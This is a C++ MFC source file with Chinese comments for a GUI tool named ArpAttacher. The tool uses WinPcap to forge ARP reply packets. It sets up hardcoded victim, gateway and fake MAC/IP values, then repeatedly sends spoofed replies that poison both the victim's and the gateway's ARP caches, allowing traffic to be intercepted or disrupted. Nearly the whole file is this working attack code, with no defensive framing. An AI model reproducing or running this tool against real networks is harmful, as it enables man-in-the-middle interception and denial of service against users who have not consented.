
// ArpAttacherDlg.cpp : 实现文件
//

#include "stdafx.h"
#include "ArpAttacher.h"
#include "ArpAttacherDlg.h"


#pragma comment(lib,"wpcap.lib")
#pragma comment(lib,"ws2_32.lib")



#ifdef _DEBUG
#define new DEBUG_NEW
#endif


// CArpAttacherDlg 对话框

CArpAttacherDlg::CArpAttacherDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CArpAttacherDlg::IDD, pParent)
	, m_iFreq(0)
	, m_strAttackIp(_T(""))
	, m_strAttackMac(_T(""))
	, m_strGateWayIp(_T(""))
	, m_strGateWayMac(_T(""))
	, m_strFalseIp(_T(""))
	, m_strFalseMac(_T(""))
{
	m_hIcon = AfxGetApp()->LoadIcon(IDR_MAINFRAME);
	this->dev_handle=NULL;
	this->alldevs=NULL;
	this->m_bStop=FALSE;
}

void CArpAttacherDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);

	DDX_Text(pDX, IDC_FREQ, m_iFreq);
	DDX_Text(pDX, IDC_ATTACK_IP, m_strAttackIp);
	DDX_Text(pDX, IDC_ATTACK_MAC, m_strAttackMac);
	DDX_Text(pDX, IDC_GATEWAY_IP, m_strGateWayIp);
	DDX_Text(pDX, IDC_GATEWAY_MAC, m_strGateWayMac);
	DDX_Text(pDX, IDC_FALSE_IP, m_strFalseIp);
	DDX_Text(pDX, IDC_FALSE_MAC, m_strFalseMac);
	DDX_Control(pDX, IDC_IFLIST, m_ifList);
}

BEGIN_MESSAGE_MAP(CArpAttacherDlg, CDialog)
	ON_WM_PAINT()
	ON_WM_QUERYDRAGICON()
	//}}AFX_MSG_MAP
	ON_BN_CLICKED(IDC_OK, &CArpAttacherDlg::OnBnClickedOk)
	ON_WM_CLOSE()
	ON_WM_DESTROY()
	ON_BN_CLICKED(IDC_CANCEL, &CArpAttacherDlg::OnBnClickedCancel)
END_MESSAGE_MAP()


// CArpAttacherDlg 消息处理程序

BOOL CArpAttacherDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// 设置此对话框的图标。当应用程序主窗口不是对话框时，框架将自动
	//  执行此操作
	SetIcon(m_hIcon, TRUE);			// 设置大图标
	SetIcon(m_hIcon, FALSE);		// 设置小图标

    pcap_if_t *d;
    char errbuf[PCAP_ERRBUF_SIZE];
  
    /* 这个API用来获得网卡 的列表 */
    if (pcap_findalldevs(&alldevs, errbuf) == -1)
    {
		this->MessageBox(TEXT("加载网卡信息失败！"));
		return FALSE;
    }

	for(d=alldevs;d;d=d->next)
	{
		char szIfInfo[512];
		sprintf(szIfInfo,"%s(%s)",d->name,d->description==NULL ? "无描述":d->description);
		m_ifList.InsertString(-1,szIfInfo);
	}
	if(m_ifList.GetCount() >0)
	{
		m_ifList.SetCurSel(0);
	}

	//this->m_strAttackIp="192.168.30.105";
	//this->m_strAttackMac="50-e5-49-4c-e0-6f";

	this->m_strAttackIp="192.168.30.129";
	this->m_strAttackMac="00-22-b0-e1-63-98";

	//this->m_strGateWayIp="192.168.30.1";
	//this->m_strGateWayMac="00-0f-e2-4c-7c-c6";

	this->m_strGateWayIp="192.168.30.1";
	this->m_strGateWayMac="00-0f-e2-4c-7c-c6";  //00-0f-e2-4c-7c-c6

	this->m_strFalseIp ="192.168.30.131";
	this->m_strFalseMac ="90-2B-34-02-39-91";

	this->UpdateData(FALSE);

	return TRUE;  // 除非将焦点设置到控件，否则返回 TRUE
}

// 如果向对话框添加最小化按钮，则需要下面的代码
//  来绘制该图标。对于使用文档/视图模型的 MFC 应用程序，
//  这将由框架自动完成。

void CArpAttacherDlg::OnPaint()
{
	if (IsIconic())
	{
		CPaintDC dc(this); // 用于绘制的设备上下文

		SendMessage(WM_ICONERASEBKGND, reinterpret_cast<WPARAM>(dc.GetSafeHdc()), 0);

		// 使图标在工作区矩形中居中
		int cxIcon = GetSystemMetrics(SM_CXICON);
		int cyIcon = GetSystemMetrics(SM_CYICON);
		CRect rect;
		GetClientRect(&rect);
		int x = (rect.Width() - cxIcon + 1) / 2;
		int y = (rect.Height() - cyIcon + 1) / 2;

		// 绘制图标
		dc.DrawIcon(x, y, m_hIcon);
	}
	else
	{
		CDialog::OnPaint();
	}
}

//当用户拖动最小化窗口时系统调用此函数取得光标
//显示。
HCURSOR CArpAttacherDlg::OnQueryDragIcon()
{
	return static_cast<HCURSOR>(m_hIcon);
}

BOOL GetMacByString(unsigned char *szMac,CString &str)
{
	if(str.GetLength() !=17)
	{
		return FALSE;
	}
	for(int i=0;i<6;i++)
	{
	    szMac[i]= _tcstol(str.Mid(i*3,2),NULL,16);
	}
	return TRUE;
}


DWORD Fun_Thread(LPVOID lpPara)
{
	CArpAttacherDlg *pThis=(CArpAttacherDlg *)lpPara;
	if(pThis->m_iFreq <=0 || pThis->m_iFreq>1000)
	{
		pThis->m_iFreq=1;
	}

	int isleep=1000/pThis->m_iFreq;
	DWORD dwTimes=0;
	char szTimes[32];
	while(!pThis->m_bStop)
	{
	 
		int ret=pcap_sendpacket(pThis->dev_handle,(const u_char *)&pThis->m_Packet1,sizeof(ARPPACKET));
		ret=pcap_sendpacket(pThis->dev_handle,(const u_char *)&pThis->m_Packet2,sizeof(ARPPACKET));
		sprintf(szTimes,"%u次",++dwTimes);
		pThis->GetDlgItem(IDC_COUNT)->SetWindowTextA(szTimes);

		::Sleep(isleep);
	}
	pThis->GetDlgItem(IDC_OK)->EnableWindow(TRUE);
	return 0;
 
}
void CArpAttacherDlg::OnBnClickedOk()
{
	// TODO: 在此添加控件通知处理程序代码
	if(this->dev_handle !=NULL)
	{
		pcap_close(this->dev_handle);
		this->dev_handle=NULL;

	}
	 
    int iSel=m_ifList.GetCurSel();
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_if_t *d=alldevs;
	for(int i=0;i<iSel;i++)
	{
		d=d->next;
	}

	if ((dev_handle= pcap_open_live(d->name,          // 设备名
    65536,            // 65535保证能捕获到不同数据链路层上的每个数据包的全部内容
    0,    // 混杂模式
    1000,             // 读取超时时间
    errbuf            // 错误缓冲池
    )) == NULL)
	{
		this->MessageBox("打开指定网卡失败！");
		return;
	}
	CString str("00-11-22-33-44-55");

	this->UpdateData();
	//Packet1
	GetMacByString(m_Packet1.dlcHeader.DesMAC, this->m_strAttackMac);
	GetMacByString(m_Packet1.dlcHeader.SrcMAC, this->m_strFalseMac);
	m_Packet1.dlcHeader.Ethertype=htons((unsigned short)0x0806);

	m_Packet1.arpFrame.HW_Type=htons((unsigned short)1);         //硬件类型为以太网类型
	m_Packet1.arpFrame.HW_Addr_Len=(unsigned char)0x6;           //以太网MAC地址长度为6
    m_Packet1.arpFrame.Opcode=htons((unsigned short)0x02);       //1为请求码，2为应答码

	m_Packet1.arpFrame.Prot_Addr_Len=(unsigned char)0x4;        //IP地址长度为 4
	m_Packet1.arpFrame.Prot_Type=htons((unsigned short)0x0800); //上层协议为ip协议
 
	GetMacByString(m_Packet1.arpFrame.Send_HW_Addr,this->m_strFalseMac);  
	m_Packet1.arpFrame.Send_Prot_Addr=inet_addr(this->m_strGateWayIp.GetBuffer());
	
	GetMacByString(m_Packet1.arpFrame.Targ_HW_Addr,this->m_strAttackMac);
	m_Packet1.arpFrame.Targ_Prot_Addr=inet_addr(this->m_strAttackIp.GetBuffer());
	
    memset(m_Packet1.arpFrame.padding,0,sizeof(m_Packet1.arpFrame.padding));



    //Packet1
	GetMacByString(m_Packet2.dlcHeader.DesMAC,this->m_strGateWayMac);
	GetMacByString(m_Packet2.dlcHeader.SrcMAC,this->m_strFalseMac);
	m_Packet2.dlcHeader.Ethertype=htons((unsigned short)0x0806);

	m_Packet2.arpFrame.HW_Type=htons((unsigned short)1);//硬件类型为以太网类型
	m_Packet2.arpFrame.HW_Addr_Len=(unsigned char)0x6;  //以太网MAC地址长度为6
    m_Packet2.arpFrame.Opcode=htons((unsigned short)0x02);//1为请求码，2为应答码

	m_Packet2.arpFrame.Prot_Addr_Len=(unsigned char)0x4;//IP地址长度为 4
	m_Packet2.arpFrame.Prot_Type=htons((unsigned short)0x0800);//上层协议为ip协议
 
	GetMacByString(m_Packet2.arpFrame.Send_HW_Addr,this->m_strFalseMac);
	m_Packet2.arpFrame.Send_Prot_Addr=inet_addr(this->m_strAttackIp.GetBuffer());
	
	GetMacByString(m_Packet2.arpFrame.Targ_HW_Addr,this->m_strGateWayMac);
	m_Packet2.arpFrame.Targ_Prot_Addr=inet_addr(this->m_strGateWayIp.GetBuffer());
	
    memset(m_Packet2.arpFrame.padding,0,sizeof(m_Packet1.arpFrame.padding));


	
	HANDLE h1=::CreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)Fun_Thread,this,0,NULL);
	::CloseHandle(h1);
	this->m_bStop =FALSE;
	this->GetDlgItem(IDC_OK)->EnableWindow(FALSE);

}

void CArpAttacherDlg::OnClose()
{
	// TODO: 在此添加消息处理程序代码和/或调用默认值

	
	CDialog::OnClose();
}

void CArpAttacherDlg::OnDestroy()
{
	if(this->alldevs !=NULL)
	{
		::pcap_freealldevs(alldevs);
	}
	if(this->dev_handle !=NULL)
	{
		pcap_close(this->dev_handle);
	}
	CDialog::OnDestroy();

	// TODO: 在此处添加消息处理程序代码
}

void CArpAttacherDlg::OnBnClickedCancel()
{
	// TODO: 在此添加控件通知处理程序代码
	this->m_bStop=TRUE;
}
